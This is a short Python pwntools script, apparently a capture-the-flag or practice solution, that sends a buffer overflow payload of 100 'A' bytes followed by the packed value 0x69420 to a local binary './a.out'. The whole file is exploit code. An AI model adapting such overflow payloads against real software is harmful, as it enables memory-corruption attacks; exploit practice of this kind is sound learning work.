# coding: utf-8
from pwn import *
payload = b"A"*100 + p32(0x69420)
p=process("./a.out")
p.recv()
p.sendline(payload)
p.recv()
